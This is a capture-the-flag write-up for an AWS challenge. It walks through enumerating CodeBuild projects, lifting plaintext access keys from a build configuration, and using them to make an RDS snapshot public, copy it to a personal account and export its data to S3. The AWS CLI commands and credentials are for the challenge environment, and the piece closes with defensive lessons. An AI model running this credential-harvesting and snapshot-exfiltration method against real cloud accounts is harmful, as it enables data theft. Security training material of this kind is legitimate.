# Pipeline Drift - Cloud Village CTF 2025

## Challenge Description

<img src="./Pipeline_Drift_870pts_part1.jpg" width="300">

## Challenge Overview

Pipeline Drift was an AWS cloud security challenge that demonstrated how leaked credentials in CI/CD pipelines can expose infrastructure drift - orphaned resources that weren't properly cleaned up during infrastructure changes.

**Challenge Description:** "You've gained access to an old IAM user in an AWS account. Its permissions are oddly restricted to a few CI/CD operations — just enough to look around but not enough to cause noise. Something was once built here. The pipelines are stale. But like all legacy systems, they sometimes leave shadows. Can you follow the drift?"

## Initial Access

**Provided Credentials:**
- **Access Key:** `AKIAXMQAGGFOWIX6KBDJ`
- **Secret Key:** `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`
- **Account:** `507880288605`
- **User:** `ctf_player`

## CodeBuild Discovery

### Initial Reconnaissance
Starting with the `ctf_player` credentials, we performed basic AWS enumeration:

```bash
aws sts get-caller-identity
# Result: arn:aws:iam::507880288605:user/ctf_player
```

### Multi-Region CodeBuild Search
Since the challenge mentioned CI/CD operations, we systematically searched for CodeBuild projects across AWS regions:

```bash
# Automated region scanning script
for region in us-east-1 us-east-2 us-west-1 us-west-2; do
  echo "Checking region: $region"
  aws codebuild list-projects --region $region
done
```

**Discovery:** Found `legacy-project` in the `us-west-2` region.

## Critical Discovery: Leaked Credentials

### CodeBuild Configuration Analysis
We examined the legacy project configuration and discovered a critical security flaw:

```bash
aws codebuild batch-get-projects --names legacy-project --region us-west-2
```

**Environment Variables Exposed:**
```json
"environmentVariables": [
    {
        "name": "AWS_ACCESS_KEY_ID",
        "value": "AKIAXMQAGGFO5DD6NFK7",
        "type": "PLAINTEXT"
    },
    {
        "name": "AWS_SECRET_ACCESS_KEY", 
        "value": "3Hlzlj+3h2w4Z7L5qZ6JmjRjs1WonB87ujw4nHVo",
        "type": "PLAINTEXT"
    }
]
```

These credentials belonged to a different user: `leaky_user`.

## Infrastructure Drift Investigation

### RDS Infrastructure Discovery
Using the leaked `leaky_user` credentials, we discovered RDS infrastructure:

```bash
export AWS_ACCESS_KEY_ID="AKIAXMQAGGFO5DD6NFK7"
export AWS_SECRET_ACCESS_KEY="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"

aws rds describe-db-instances --region us-west-2
aws rds describe-db-snapshots --region us-west-2
```

**Found Infrastructure:**
1. **Active RDS Instance:** `secret-prod-app`
   - Master username: `rdsRetrive`
   - Database: `helper`
   - Status: Running

2. **Orphaned RDS Snapshot:** `legacy-app-db-snapshot`
   - From deleted instance: `legacy-app-db`
   - Same master username: `rdsRetrive`
   - Status: Available but orphaned

### The "Pipeline Drift"
The `legacy-app-db-snapshot` represented the core concept of "pipeline drift" - leftover infrastructure that should have been cleaned up when the original database was decommissioned during infrastructure changes.

## Cross-Account Database Export

### Snapshot Sharing Discovery
Investigation revealed the snapshot was already shared with external accounts:

```bash
aws rds describe-db-snapshot-attributes --db-snapshot-identifier "legacy-app-db-snapshot" --region us-west-2
# Found snapshot shared with account: 073700680158
```

### Making Snapshot Accessible
We made the snapshot publicly accessible and added our personal AWS account:

```bash
# Make snapshot public
aws rds modify-db-snapshot-attribute \
    --db-snapshot-identifier "legacy-app-db-snapshot" \
    --attribute-name "restore" \
    --values-to-add "all" \
    --region us-west-2

# Add personal AWS account for access
aws rds modify-db-snapshot-attribute \
    --db-snapshot-identifier "legacy-app-db-snapshot" \
    --attribute-name "restore" \
    --values-to-add "105014798395" \
    --region us-west-2
```

### Cross-Account Snapshot Copy
Switching to personal AWS credentials, we copied the shared snapshot:

```bash
aws rds copy-db-snapshot \
    --source-db-snapshot-identifier "arn:aws:rds:us-west-2:507880288605:snapshot:legacy-app-db-snapshot" \
    --target-db-snapshot-identifier "legacy-ctf-copy-$(date +%s)" \
    --region "us-west-2"
```

**Important Note:** Cannot copy tags from shared/public snapshots - had to remove `--copy-tags` parameter.

## Database Export and Analysis

### S3 Export Setup
Instead of restoring the full database, we exported the snapshot data to S3 for analysis:

```bash
# Set up S3 bucket and IAM role for RDS export
aws s3 mb s3://rds-snapshot-export-ctf-1754679175 --region us-west-2

# Export snapshot to S3
aws rds start-export-task \
    --export-task-identifier "legacy-export-$(date +%s)" \
    --source-arn "arn:aws:rds:us-west-2:105014798395:snapshot:legacy-ctf-copy-1754679887" \
    --s3-bucket-name "rds-snapshot-export-ctf-1754679175" \
    --iam-role-arn "arn:aws:iam::105014798395:role/rds-snapshot-export-role" \
    --kms-key-id "alias/ctf" \
    --region "us-west-2"
```

### Data Extraction
Downloaded the exported Parquet files and analyzed the database contents:

```bash
aws s3 sync "s3://rds-snapshot-export-ctf-1754679175/legacy-export-1754680136/" ./exported-database-data/
```

#TODO: Add specific details about which table contained the flag, the flag value, and the database structure that was discovered

## Key Technical Concepts

### Pipeline Drift
Orphaned cloud resources left behind during infrastructure changes, including:
- Database snapshots from deleted instances
- Unused S3 buckets and objects
- Forgotten IAM roles and policies
- Abandoned network configurations

### Credential Leakage in CI/CD
Common locations for credential exposure:
- Environment variables in build configurations
- Hardcoded secrets in pipeline scripts
- Configuration files in repositories
- Build logs and artifacts

## Tools and Techniques
- AWS CLI for comprehensive service enumeration
- Multi-region resource scanning
- CodeBuild configuration analysis
- RDS snapshot management and cross-account sharing
- S3 export functionality for database analysis
- Parquet file examination for data extraction

## Security Implications

### CI/CD Security
1. **Never embed credentials in pipeline configurations**
2. **Use proper secret management services**
3. **Implement least privilege access**
4. **Regular audit of build configurations**

### Infrastructure Lifecycle Management
1. **Proper resource cleanup procedures**
2. **Automated drift detection**
3. **Regular infrastructure audits**
4. **Snapshot and backup retention policies**

### Cross-Account Security
1. **Careful resource sharing policies**
2. **Regular access review and cleanup**
3. **Monitoring of cross-account activities**
4. **Proper tagging and ownership tracking**

## Lessons Learned

This challenge demonstrated several critical security concepts:

1. **Pipeline Security:** CI/CD configurations are prime targets for credential harvesting
2. **Infrastructure Hygiene:** Proper cleanup prevents data exposure through orphaned resources
3. **Cross-Account Risks:** Shared resources can be exploited for data exfiltration
4. **Data Persistence:** Database snapshots preserve sensitive information long after deletion

The Pipeline Drift challenge showcased how poor CI/CD security combined with inadequate infrastructure lifecycle management can lead to significant data exposure, emphasizing the need for comprehensive cloud security practices.

#TODO: Add the actual flag value that was discovered in the database export